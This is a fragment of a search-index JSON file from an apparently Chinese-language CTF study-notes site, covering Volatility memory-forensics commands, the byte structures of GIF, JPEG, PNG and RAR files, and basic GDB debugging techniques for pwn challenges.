\u626b\u63cf\u6240\u6709\u7684\u6587\u4ef6\u5217\u8868(\u5e38\u5e38\u7ed3\u5408grep\uff0c\u5373\u6b63\u5219) volatility -f file.raw --profile=WinXPSP2x86 filescan \u6839\u636eoffset\u63d0\u53d6\u51fa\u6587\u4ef6 volatility -f file.raw --profile=WinXPSP2x86 dumpfiles -D . -Q 0x..... \u626b\u63cf Windows \u7684\u670d\u52a1 volatility -f file.raw --profile=WinXPSP2x86 svcscan \u67e5\u770b\u7f51\u7edc\u8fde\u63a5 volatility -f file.raw --profile=WinXPSP2x86 connscan \u67e5\u770b\u547d\u4ee4\u884c\u4e0a\u7684\u64cd\u4f5c volatility -f file.raw --profile=WinXPSP2x86 cmdscan \u6839\u636epid dump\u51fa\u76f8\u5e94\u7684\u8fdb\u7a0b volatility -f easy_dump.img --profile=Win7SP1x64 memdump -p 2580 -D \u76ee\u5f55","title":"\u4f7f\u7528"},{"location":"Misc/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-volatility/#_3","text":"\u5185\u5b58\u53d6\u8bc1\u4e4b\u65c5 \u5185\u5b58\u53d6\u8bc1\u5de5\u5177volatility\u7528\u6cd5\u4e0e\u5b9e\u6218 \uff08ps:\u8fd9\u4e2a\u542b\u624b\u52a8\u5b89\u88c5\uff09","title":"\u53c2\u8003"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/","text":"\u56fe\u7247\u7684\u7ed3\u6784 \u00b6 Gif \u00b6 \u4e00\u4e2aGIF\u6587\u4ef6\u7684\u7ed3\u6784\u53ef\u5206\u4e3a\u6587\u4ef6\u5934(File Header)\u3001GIF\u6570\u636e\u6d41(GIF Data Stream)\u548c\u6587\u4ef6\u7ec8\u7ed3\u5668(Trailer)\u4e09\u4e2a\u90e8\u5206\u3002 \u6587\u4ef6\u5934\u90e8\u5206 \u00b6 GIF\u7f72\u540d(Signature)\u548c\u7248\u672c\u53f7(Version) \u00b6 GIF\u7f72\u540d\u7528\u6765\u786e\u8ba4\u4e00\u4e2a\u6587\u4ef6\u662f\u5426\u662fGIF\u683c\u5f0f\u7684\u6587\u4ef6\uff0c\u8fd9\u4e00\u90e8\u5206\u7531\u4e09\u4e2a\u5b57\u7b26\u7ec4\u6210\uff1a\"GIF\";\u6587\u4ef6\u7248\u672c\u53f7\u4e5f\u662f\u7531\u4e09\u4e2a\u5b57\u8282\u7ec4\u6210,\u53ef\u4ee5\u4e3a\"87a\"\u6216\"89a\".\u5177\u4f53\u63cf\u8ff0\u89c1\u4e0b\u8868: \u5bf9\u5e94\u5230\u5b9e\u9645\u6587\u4ef6\u4e2d\uff1a GIF\u6570\u636e\u6d41\u90e8\u5206(GIF Data Stream) \u00b6 \u8fd9\u90e8\u5206\u4e0d\u662f\u6309\u7167\u987a\u5e8f\u8bb0\u5f55\uff0c\u8be6\u7ec6\u987a\u5e8f\u53c2\u7167\u4e0a\u9762\u7684Gif\u603b\u7ed3\u6784\u8868 \u56fe\u8c61\u6807\u8bc6\u7b26(Image Descriptor) \u00b6 \u4e00\u4e2aGIF\u6587\u4ef6\u5185\u53ef\u4ee5\u5305\u542b\u591a\u5e45\u56fe\u8c61\uff0c\u4e00\u5e45\u56fe\u8c61\u7ed3\u675f\u4e4b\u540e\u7d27\u63a5\u7740\u4e0b\u662f\u4e00\u5e45\u56fe\u8c61\u7684\u6807\u8bc6\u7b26\uff0c\u56fe\u8c61\u6807\u8bc6\u7b26\u4ee50x2C(',')\u5b57\u7b26\u5f00\u59cb\uff0c\u5b9a\u4e49\u7d27\u63a5\u7740\u5b83\u7684\u56fe\u8c61\u7684\u6027\u8d28\uff0c\u5305\u62ec\u56fe\u8c61\u76f8\u5bf9\u4e8e\u903b\u8f91\u5c4f\u5e55\u8fb9\u754c\u7684\u504f\u79fb\u91cf\u3001\u56fe\u8c61\u5927\u5c0f\u4ee5\u53ca\u6709\u65e0\u5c40\u90e8\u989c\u8272\u5217\u8868\u548c\u989c\u8272\u5217\u8868\u5927\u5c0f\uff0c\u753110\u4e2a\u5b57\u8282\u7ec4\u6210\uff1a \u6ce8\u91ca\u6269\u5c55(Comment Extension) \u00b6 \u8fd9\u4e00\u90e8\u5206\u662f\u53ef\u9009\u7684\uff08\u9700\u898189a\u7248\u672c\uff09\uff0c\u53ef\u4ee5\u7528\u6765\u8bb0\u5f55\u56fe\u5f62\u3001\u7248\u6743\u3001\u63cf\u8ff0\u7b49\u4efb\u4f55\u7684\u975e\u56fe\u5f62\u548c\u63a7\u5236\u7684\u7eaf\u6587\u672c\u6570\u636e(7-bit ASCII\u5b57\u7b26)\uff0c\u6ce8\u91ca\u6269\u5c55\u5e76\u4e0d\u5f71\u54cd\u5bf9\u56fe\u8c61\u6570\u636e\u6d41\u7684\u5904\u7406\uff0c\u89e3\u7801\u5668\u5b8c\u5168\u53ef\u4ee5\u5ffd\u7565\u5b83\u3002\u5b58\u653e\u4f4d\u7f6e\u53ef\u4ee5\u662f\u6570\u636e\u6d41\u7684\u4efb\u4f55\u5730\u65b9\uff0c\u6700\u597d\u4e0d\u8981\u59a8\u788d\u63a7\u5236\u548c\u6570\u636e\u5757\uff0c\u63a8\u8350\u653e\u5728\u6570\u636e\u6d41\u7684\u5f00\u59cb\u6216\u7ed3\u5c3e\u3002\u5177\u4f53\u7ec4\u6210\uff1a \u6587\u4ef6\u7ed3\u5c3e\u90e8\u5206 \u00b6 \u6587\u4ef6\u7ec8\u7ed3\u5668(Trailer) \u00b6 \u8fd9\u4e00\u90e8\u5206\u53ea\u6709\u4e00\u4e2a\u503c\u4e3a0\u7684\u5b57\u8282\uff0c\u6807\u8bc6\u4e00\u4e2aGIF\u6587\u4ef6\u7ed3\u675f. \u5bf9\u5e94\u5230\u5b9e\u9645\u4e2d\uff1a \u53c2\u8003\u6587\u7ae0 \u00b6 Gif\u6587\u6863 JPG \u00b6 JPG/JPEG\u5185\u90e8\u5b58\u50a8\u662f\u5757\u72b6\u7c7b\u578b\uff08\u5373\u6587\u4ef6\u5185\u90e8\u5206\u4e3a\u82e5\u5e72\u5757\uff09\uff0c\u8fd9\u4e9b\u5757\u7531ff\u5f00\u5934\uff0cff\u540e\u7d27\u8ddf\u7684\u4e00\u4e2a\u6807\u8bb0\u7b26\u6307\u660e\u4e86\u8fd9\u4e2a\u5757\u7684\u7c7b\u578b\u3002 JPEG (jpg) \u6587\u4ef6\u5934\uff1aFFD8FF\u6587\u4ef6\u5c3e\uff1aFF D9 \u8fd9\u4e9b\u5206\u5757\u6309\u51fa\u73b0\u987a\u5e8f\u5206\u522b\u662f\uff1a \u6587\u4ef6\u5f00\u59cb&\u7ed3\u675f \u00b6 FFE0 APP0 \u56fe\u50cf\u8bc6\u522b\u4fe1\u606f \u00b6 FFE0\uff1a\u5b9a\u4e49\u4ea4\u6362\u683c\u5f0f\u548c\u56fe\u50cf\u8bc6\u522b\u4fe1\u606f 4a46 4946 00\uff1aJFIF\u683c\u5f0f\u6807\u8bc6\u7b26 01 01\uff1a\u7248\u672c\u53f7\uff08\u7b2c\u4e00\u4e2a01\u662f\u4e3b\u7248\u672c\u597d\uff0c\u7b2c\u4e8c\u4e2a01\u662f\u6b21\u7248\u672c\u53f7\uff09 01\uff1a\u5355\u4f4d\uff0800=\u65e0\u5355\u4f4d\uff1b01=\u70b9\u6570/\u82f1\u5bf8\uff1b02=\u70b9\u6570/\u5398\u7c73\uff09 0078\uff1a\u4e3a\u6c34\u5e73\u5206\u8fa8\u7387 0078\uff1a\u4e3a\u7ad6\u76f4\u5206\u8fa8\u7387 00\uff1a\u6c34\u5e73\u70b9\u6570 00\uff1a\u7ad6\u76f4\u70b9\u6570 TIPs \u00b6 jpg\u6587\u4ef6\u7f3a\u5c11\u6587\u4ef6\u5c3e\u5728windows\u4e0b\u4e5f\u80fd\u88ab\u6b63\u786e\u6253\u5f00\u3002\uff08bugku\u4e2d\u7684\u8fd9\u662f\u4e00\u5f20\u5355\u7eaf\u7684\u56fe\u7247\uff09 \u53c2\u8003 \u00b6 JPG\u6587\u4ef6\u683c\u5f0f\u521d\u6b65\u8ba4\u8bc6 JPEG\u6587\u4ef6\u4e8c\u8fdb\u5236\u683c\u5f0f\u5206\u6790 PNG \u00b6 PNG\u6587\u4ef6\u7ed3\u6784\u5f88\u7b80\u5355\uff0c\u4e3b\u8981\u6709\u6570\u636e\u5757(Chunk Block)\u7ec4\u6210\uff0c\u6700\u5c11\u5305\u542b4\u4e2a\u6570\u636e\u5757\u3002 PNG\u56fe\u50cf\u6807\u8bc6\u7b26 \u00b6 \u6839\u636ePNG\u6587\u4ef6\u7684\u5b9a\u4e49\u6765\u8bf4\uff0c\u5176\u6587\u4ef6\u5934\u4f4d\u7f6e\u603b\u662f\u7531\u4f4d\u56fa\u5b9a\u7684\u5b57\u8282\u6765\u63cf\u8ff0\u7684\uff1a IHDR\u6570\u636e\u5757 \u00b6 \u6587\u4ef6\u5934\u6570\u636e\u5757IHDR(header chunk)\uff1a\u5b83\u5305\u542b\u6709PNG\u6587\u4ef6\u4e2d\u5b58\u50a8\u7684\u56fe\u50cf\u6570\u636e\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u5e76\u8981\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u6570\u636e\u5757\u51fa\u73b0\u5728PNG\u6570\u636e\u6d41\u4e2d\uff0c\u800c\u4e14\u4e00\u4e2aPNG\u6570\u636e\u6d41\u4e2d\u53ea\u80fd\u6709\u4e00\u4e2a\u6587\u4ef6\u5934\u6570\u636e\u5757\u3002 \u6587\u4ef6\u5934\u6570\u636e\u5757\u753113\u5b57\u8282\u7ec4\u6210\uff0c\u5b83\u7684\u683c\u5f0f\u5982\u4e0b\u8868\u6240\u793a\uff1a 00 00 00 0D\uff1aIHDR\u5934\u5757\u957f\u4e3a13 49 48 44 52\uff1aIHDR\u6807\u8bc6 00 00 13 40\uff1a\u56fe\u50cf\u7684\u5bbd 00 00 0C C0\uff1a\u56fe\u50cf\u7684\u9ad8 44 6D AD B8\uff1aCRC\u6821\u9a8c IEND\u56fe\u50cf\u7ed3\u675f\u6570\u636e \u00b6 \u5b83\u7528\u6765\u6807\u8bb0PNG\u6587\u4ef6\u6216\u8005\u6570\u636e\u6d41\u5df2\u7ecf\u7ed3\u675f\uff0c\u5e76\u4e14\u5fc5\u987b\u8981\u653e\u5728\u6587\u4ef6\u7684\u5c3e\u90e8\u3002 \u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u89c2\u5bdfPNG\u6587\u4ef6\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\uff0c\u6587\u4ef6\u7684\u7ed3\u5c3e12\u4e2a\u5b57\u7b26\u770b\u8d77\u6765\u603b\u5e94\u8be5\u662f\u8fd9\u6837\u7684\uff1a \u7531\u4e8e\u6570\u636e\u5757\u7ed3\u6784\u7684\u5b9a\u4e49\uff0cIEND\u6570\u636e\u5757\u7684\u957f\u5ea6\u603b\u662f0\uff0800 00 00 00\uff0c\u9664\u975e\u4eba\u4e3a\u52a0\u5165\u4fe1\u606f\uff09\uff0c\u6570\u636e\u6807\u8bc6\u603b\u662fIEND\uff0849 45 4E 44\uff09\uff0c\u56e0\u6b64\uff0cCRC\u7801\u4e5f\u603b\u662fAE 42 60 82\u3002 \u538b\u7f29\u5305 \u00b6 rar \u00b6 rar \u65e0\u52a0\u5bc6\u72b6\u6001\u4e0b\uff0c\u538b\u7f29\u5305\u91cc\u9762\u6bcf\u4e2a\u6587\u4ef6\u524d\u90fd\u6709\u6587\u4ef6\u5934\u8868\u793a 0x74 \u53c2\u8003 \u00b6 PNG\u56fe\u7247\u6587\u4ef6\u7ed3\u6784\u5206\u6790","title":"\u6587\u4ef6\u7684\u7ed3\u6784"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#_1","text":"","title":"\u56fe\u7247\u7684\u7ed3\u6784"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#gif","text":"\u4e00\u4e2aGIF\u6587\u4ef6\u7684\u7ed3\u6784\u53ef\u5206\u4e3a\u6587\u4ef6\u5934(File Header)\u3001GIF\u6570\u636e\u6d41(GIF Data Stream)\u548c\u6587\u4ef6\u7ec8\u7ed3\u5668(Trailer)\u4e09\u4e2a\u90e8\u5206\u3002","title":"Gif"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#_2","text":"","title":"\u6587\u4ef6\u5934\u90e8\u5206"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#gifsignatureversion","text":"GIF\u7f72\u540d\u7528\u6765\u786e\u8ba4\u4e00\u4e2a\u6587\u4ef6\u662f\u5426\u662fGIF\u683c\u5f0f\u7684\u6587\u4ef6\uff0c\u8fd9\u4e00\u90e8\u5206\u7531\u4e09\u4e2a\u5b57\u7b26\u7ec4\u6210\uff1a\"GIF\";\u6587\u4ef6\u7248\u672c\u53f7\u4e5f\u662f\u7531\u4e09\u4e2a\u5b57\u8282\u7ec4\u6210,\u53ef\u4ee5\u4e3a\"87a\"\u6216\"89a\".\u5177\u4f53\u63cf\u8ff0\u89c1\u4e0b\u8868: \u5bf9\u5e94\u5230\u5b9e\u9645\u6587\u4ef6\u4e2d\uff1a","title":"GIF\u7f72\u540d(Signature)\u548c\u7248\u672c\u53f7(Version)"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#gifgif-data-stream","text":"\u8fd9\u90e8\u5206\u4e0d\u662f\u6309\u7167\u987a\u5e8f\u8bb0\u5f55\uff0c\u8be6\u7ec6\u987a\u5e8f\u53c2\u7167\u4e0a\u9762\u7684Gif\u603b\u7ed3\u6784\u8868","title":"GIF\u6570\u636e\u6d41\u90e8\u5206(GIF Data Stream)"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#image-descriptor","text":"\u4e00\u4e2aGIF\u6587\u4ef6\u5185\u53ef\u4ee5\u5305\u542b\u591a\u5e45\u56fe\u8c61\uff0c\u4e00\u5e45\u56fe\u8c61\u7ed3\u675f\u4e4b\u540e\u7d27\u63a5\u7740\u4e0b\u662f\u4e00\u5e45\u56fe\u8c61\u7684\u6807\u8bc6\u7b26\uff0c\u56fe\u8c61\u6807\u8bc6\u7b26\u4ee50x2C(',')\u5b57\u7b26\u5f00\u59cb\uff0c\u5b9a\u4e49\u7d27\u63a5\u7740\u5b83\u7684\u56fe\u8c61\u7684\u6027\u8d28\uff0c\u5305\u62ec\u56fe\u8c61\u76f8\u5bf9\u4e8e\u903b\u8f91\u5c4f\u5e55\u8fb9\u754c\u7684\u504f\u79fb\u91cf\u3001\u56fe\u8c61\u5927\u5c0f\u4ee5\u53ca\u6709\u65e0\u5c40\u90e8\u989c\u8272\u5217\u8868\u548c\u989c\u8272\u5217\u8868\u5927\u5c0f\uff0c\u753110\u4e2a\u5b57\u8282\u7ec4\u6210\uff1a","title":"\u56fe\u8c61\u6807\u8bc6\u7b26(Image Descriptor)"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#comment-extension","text":"\u8fd9\u4e00\u90e8\u5206\u662f\u53ef\u9009\u7684\uff08\u9700\u898189a\u7248\u672c\uff09\uff0c\u53ef\u4ee5\u7528\u6765\u8bb0\u5f55\u56fe\u5f62\u3001\u7248\u6743\u3001\u63cf\u8ff0\u7b49\u4efb\u4f55\u7684\u975e\u56fe\u5f62\u548c\u63a7\u5236\u7684\u7eaf\u6587\u672c\u6570\u636e(7-bit ASCII\u5b57\u7b26)\uff0c\u6ce8\u91ca\u6269\u5c55\u5e76\u4e0d\u5f71\u54cd\u5bf9\u56fe\u8c61\u6570\u636e\u6d41\u7684\u5904\u7406\uff0c\u89e3\u7801\u5668\u5b8c\u5168\u53ef\u4ee5\u5ffd\u7565\u5b83\u3002\u5b58\u653e\u4f4d\u7f6e\u53ef\u4ee5\u662f\u6570\u636e\u6d41\u7684\u4efb\u4f55\u5730\u65b9\uff0c\u6700\u597d\u4e0d\u8981\u59a8\u788d\u63a7\u5236\u548c\u6570\u636e\u5757\uff0c\u63a8\u8350\u653e\u5728\u6570\u636e\u6d41\u7684\u5f00\u59cb\u6216\u7ed3\u5c3e\u3002\u5177\u4f53\u7ec4\u6210\uff1a","title":"\u6ce8\u91ca\u6269\u5c55(Comment Extension)"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#_3","text":"","title":"\u6587\u4ef6\u7ed3\u5c3e\u90e8\u5206"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#trailer","text":"\u8fd9\u4e00\u90e8\u5206\u53ea\u6709\u4e00\u4e2a\u503c\u4e3a0\u7684\u5b57\u8282\uff0c\u6807\u8bc6\u4e00\u4e2aGIF\u6587\u4ef6\u7ed3\u675f. \u5bf9\u5e94\u5230\u5b9e\u9645\u4e2d\uff1a","title":"\u6587\u4ef6\u7ec8\u7ed3\u5668(Trailer)"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#_4","text":"Gif\u6587\u6863","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#jpg","text":"JPG/JPEG\u5185\u90e8\u5b58\u50a8\u662f\u5757\u72b6\u7c7b\u578b\uff08\u5373\u6587\u4ef6\u5185\u90e8\u5206\u4e3a\u82e5\u5e72\u5757\uff09\uff0c\u8fd9\u4e9b\u5757\u7531ff\u5f00\u5934\uff0cff\u540e\u7d27\u8ddf\u7684\u4e00\u4e2a\u6807\u8bb0\u7b26\u6307\u660e\u4e86\u8fd9\u4e2a\u5757\u7684\u7c7b\u578b\u3002 JPEG (jpg) \u6587\u4ef6\u5934\uff1aFFD8FF\u6587\u4ef6\u5c3e\uff1aFF D9 \u8fd9\u4e9b\u5206\u5757\u6309\u51fa\u73b0\u987a\u5e8f\u5206\u522b\u662f\uff1a","title":"JPG"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#_5","text":"","title":"\u6587\u4ef6\u5f00\u59cb&amp;\u7ed3\u675f"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#ffe0-app0","text":"FFE0\uff1a\u5b9a\u4e49\u4ea4\u6362\u683c\u5f0f\u548c\u56fe\u50cf\u8bc6\u522b\u4fe1\u606f 4a46 4946 00\uff1aJFIF\u683c\u5f0f\u6807\u8bc6\u7b26 01 01\uff1a\u7248\u672c\u53f7\uff08\u7b2c\u4e00\u4e2a01\u662f\u4e3b\u7248\u672c\u597d\uff0c\u7b2c\u4e8c\u4e2a01\u662f\u6b21\u7248\u672c\u53f7\uff09 01\uff1a\u5355\u4f4d\uff0800=\u65e0\u5355\u4f4d\uff1b01=\u70b9\u6570/\u82f1\u5bf8\uff1b02=\u70b9\u6570/\u5398\u7c73\uff09 0078\uff1a\u4e3a\u6c34\u5e73\u5206\u8fa8\u7387 0078\uff1a\u4e3a\u7ad6\u76f4\u5206\u8fa8\u7387 00\uff1a\u6c34\u5e73\u70b9\u6570 00\uff1a\u7ad6\u76f4\u70b9\u6570","title":"FFE0 APP0 \u56fe\u50cf\u8bc6\u522b\u4fe1\u606f"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#tips","text":"jpg\u6587\u4ef6\u7f3a\u5c11\u6587\u4ef6\u5c3e\u5728windows\u4e0b\u4e5f\u80fd\u88ab\u6b63\u786e\u6253\u5f00\u3002\uff08bugku\u4e2d\u7684\u8fd9\u662f\u4e00\u5f20\u5355\u7eaf\u7684\u56fe\u7247\uff09","title":"TIPs"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#_6","text":"JPG\u6587\u4ef6\u683c\u5f0f\u521d\u6b65\u8ba4\u8bc6 JPEG\u6587\u4ef6\u4e8c\u8fdb\u5236\u683c\u5f0f\u5206\u6790","title":"\u53c2\u8003"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#png","text":"PNG\u6587\u4ef6\u7ed3\u6784\u5f88\u7b80\u5355\uff0c\u4e3b\u8981\u6709\u6570\u636e\u5757(Chunk Block)\u7ec4\u6210\uff0c\u6700\u5c11\u5305\u542b4\u4e2a\u6570\u636e\u5757\u3002","title":"PNG"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#png_1","text":"\u6839\u636ePNG\u6587\u4ef6\u7684\u5b9a\u4e49\u6765\u8bf4\uff0c\u5176\u6587\u4ef6\u5934\u4f4d\u7f6e\u603b\u662f\u7531\u4f4d\u56fa\u5b9a\u7684\u5b57\u8282\u6765\u63cf\u8ff0\u7684\uff1a","title":"PNG\u56fe\u50cf\u6807\u8bc6\u7b26"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#ihdr","text":"\u6587\u4ef6\u5934\u6570\u636e\u5757IHDR(header chunk)\uff1a\u5b83\u5305\u542b\u6709PNG\u6587\u4ef6\u4e2d\u5b58\u50a8\u7684\u56fe\u50cf\u6570\u636e\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u5e76\u8981\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u6570\u636e\u5757\u51fa\u73b0\u5728PNG\u6570\u636e\u6d41\u4e2d\uff0c\u800c\u4e14\u4e00\u4e2aPNG\u6570\u636e\u6d41\u4e2d\u53ea\u80fd\u6709\u4e00\u4e2a\u6587\u4ef6\u5934\u6570\u636e\u5757\u3002 \u6587\u4ef6\u5934\u6570\u636e\u5757\u753113\u5b57\u8282\u7ec4\u6210\uff0c\u5b83\u7684\u683c\u5f0f\u5982\u4e0b\u8868\u6240\u793a\uff1a 00 00 00 0D\uff1aIHDR\u5934\u5757\u957f\u4e3a13 49 48 44 52\uff1aIHDR\u6807\u8bc6 00 00 13 40\uff1a\u56fe\u50cf\u7684\u5bbd 00 00 0C C0\uff1a\u56fe\u50cf\u7684\u9ad8 44 6D AD B8\uff1aCRC\u6821\u9a8c","title":"IHDR\u6570\u636e\u5757"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#iend","text":"\u5b83\u7528\u6765\u6807\u8bb0PNG\u6587\u4ef6\u6216\u8005\u6570\u636e\u6d41\u5df2\u7ecf\u7ed3\u675f\uff0c\u5e76\u4e14\u5fc5\u987b\u8981\u653e\u5728\u6587\u4ef6\u7684\u5c3e\u90e8\u3002 \u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u89c2\u5bdfPNG\u6587\u4ef6\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\uff0c\u6587\u4ef6\u7684\u7ed3\u5c3e12\u4e2a\u5b57\u7b26\u770b\u8d77\u6765\u603b\u5e94\u8be5\u662f\u8fd9\u6837\u7684\uff1a \u7531\u4e8e\u6570\u636e\u5757\u7ed3\u6784\u7684\u5b9a\u4e49\uff0cIEND\u6570\u636e\u5757\u7684\u957f\u5ea6\u603b\u662f0\uff0800 00 00 00\uff0c\u9664\u975e\u4eba\u4e3a\u52a0\u5165\u4fe1\u606f\uff09\uff0c\u6570\u636e\u6807\u8bc6\u603b\u662fIEND\uff0849 45 4E 44\uff09\uff0c\u56e0\u6b64\uff0cCRC\u7801\u4e5f\u603b\u662fAE 42 60 82\u3002","title":"IEND\u56fe\u50cf\u7ed3\u675f\u6570\u636e"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#_7","text":"","title":"\u538b\u7f29\u5305"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#rar","text":"rar \u65e0\u52a0\u5bc6\u72b6\u6001\u4e0b\uff0c\u538b\u7f29\u5305\u91cc\u9762\u6bcf\u4e2a\u6587\u4ef6\u524d\u90fd\u6709\u6587\u4ef6\u5934\u8868\u793a 0x74","title":"rar"},{"location":"Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/#_8","text":"PNG\u56fe\u7247\u6587\u4ef6\u7ed3\u6784\u5206\u6790","title":"\u53c2\u8003"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/","text":"x \u67e5\u8be2\u6307\u4ee4 \u00b6 x \u6307\u4ee4\u7528\u4e8e\u67e5\u770b\u5185\u5b58\u5730\u5740\u7684\u503c\uff0c x \u547d\u4ee4\u8bed\u6cd5\uff1a x/<n/f/u> <target addr> n \uff1a\u8f93\u51fa\u4e2a\u6570 f \uff1a\u663e\u793a\u683c\u5f0f\u3002 \u5728 pwn \u9898\u4e2d\u901a\u5e38\u90fd\u662f\u4f7f\u7528 16 \u8fdb\u5236\u67e5\u770b\u3002 x \uff1a\u5341\u516d\u8fdb\u5236\uff08\u5e38\u7528\uff09 d \uff1a\u5341\u8fdb\u5236\u683c\u5f0f u \uff1a\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u65e0\u7b26\u53f7\u6574\u578b o \uff1a\u516b\u8fdb\u5236\u683c\u5f0f\u91cf t \uff1a\u4e8c\u8fdb\u5236\u683c\u5f0f c \uff1a\u5b57\u7b26\u683c\u5f0f f \uff1a\u6d6e\u70b9\u6570\u683c\u5f0f u \uff1a\u67e5\u770b\u5b57\u8282\u5355\u5143\u6570\u3002\u5728 pwn \u9898\u4e2d\uff0c\u6839\u636e\u9898\u76ee\u662f 32 \u4f4d\u8fd8\u662f 64 \u4f4d\u7075\u6d3b\u5207\u6362 w \u548c g b \uff1a\u5355\u5b57\u8282\uff088 \u4f4d\uff0c1 \u4e2a\u5b57\u8282\uff09 h \uff1a\u53cc\u5b57\u8282\uff0816 \u4f4d\uff0c2 \u4e2a\u5b57\u8282\uff09 w \uff1a\u5b57\uff0832\u4f4d\uff0c4 \u4e2a\u5b57\u8282\uff09\uff08\u5e38\u7528\uff09 g \uff1a\u5927\u5b57\uff0864 \u4f4d\uff0c8 \u4e2a\u5b57\u8282\uff09\uff08\u5e38\u7528\uff09 \u53ef\u80fd\u5e38\u7528\u5f62\u5f0f\uff1a x /20xg addr \u67e5 64 \u4f4d\u7a0b\u5e8f\u5185\u5b58\u4fe1\u606f x /20xw addr \u67e5 32 \u4f4d\u7a0b\u5e8f\u5185\u5b58\u4fe1\u606f \u67e5\u770b\u8c03\u7528\u4e2d\u7684\u5806\u6808 \u00b6 where \uff1a\u663e\u793a\u8c03\u7528\u5806\u6808 frame \uff1a\u663e\u793a\u8c03\u7528\u5806\u6808\u9876\u90e8 up \uff1a\u5411\u8c03\u7528\u5806\u6808\u5e95\u90e8\u79fb\u52a8 down \uff1a\u5411\u8c03\u7528\u5806\u6808\u9876\u90e8\u79fb\u52a8 GDB \u8c03\u8bd5 PIE \u7a0b\u5e8f \u00b6 \u65b9\u6cd5\u4e00\uff1a \u00b6 \u5b89\u88c5 pwndbg \u63d2\u4ef6\uff0c\u7136\u540e\u8fd9\u6837\u4e0b\u65ad\u70b9\uff1a0x\u76f8\u5bf9\u57fa\u5740\u504f\u79fb\u5c31\u662f IDA \u663e\u793a\u7684\u4e09\u4f4d\u6570 b * $rebase ( 0x\u76f8\u5bf9\u57fa\u5740\u504f\u79fb ) \u65b9\u6cd5\u4e8c\uff1a \u00b6 \u5728 /proc \u76ee\u5f55\u4e2d\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u4f1a\u5728\u6b64\u76ee\u5f55\u4e0b\u65b0\u5efa\u4e00\u4e2a\u4ee5\u8fdb\u7a0b id \u4e3a\u540d\u7684\u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u5b58\u50a8\u7740\u8fdb\u7a0b\u7684\u52a8\u6001\u94fe\u63a5\u548c\u5730\u5740\u7684\u4fe1\u606f\u3002 \u5728\u6bcf\u4e2a\u8fdb\u7a0b\u7684 map_file \u6587\u4ef6\u5939\u4e2d\uff0c\u5b58\u50a8\u7740\u5404\u4e2a\u5730\u5740\u6bb5\u7684\u52a8\u6001\u94fe\u63a5\u6587\u4ef6\uff08\u5730\u5740\uff09\u3002 \u67e5\u627e\u5f53\u524d\u8fdb\u7a0b pid \u4e3a 6158 : $ ps -aux | grep \u7a0b\u5e8f\u540d hu 6158 0 .0 0 .0 4356 632 pts/18 S+ 07 :50 0 :00 ./\u7a0b\u5e8f\u540d hu 6162 0 .0 0 .0 21292 1088 pts/20 S+ 07 :51 0 :00 grep --color = auto \u7a0b\u5e8f\u540d \u77e5\u9053 pid \u4e4b\u540e\u6709\u4e24\u79cd\u65b9\u5f0f\u83b7\u53d6 elf \u673a\u5236 \u65b9\u5f0f\u4e00\uff1a \u00b6 \u8fdb\u5165\u76ee\u5f55 /proc/{pid}/map_files \u67e5\u8be2\u52a8\u6001\u94fe\u63a5\u6587\u4ef6\uff08\u5730\u5740\uff09: /proc/6158/map_files$ ls 557d7b317000-557d7b319000 7f0d1da3c000-7f0d1dc3c000 7f0d1de6b000-7f0d1de6c000 557d7b518000-557d7b519000 7f0d1dc3c000-7f0d1dc40000 7f0d1de6c000-7f0d1de6d000 557d7b519000-557d7b51a000 7f0d1dc40000-7f0d1dc42000 7f0d1d87c000-7f0d1da3c000 7f0d1dc46000-7f0d1dc6c000 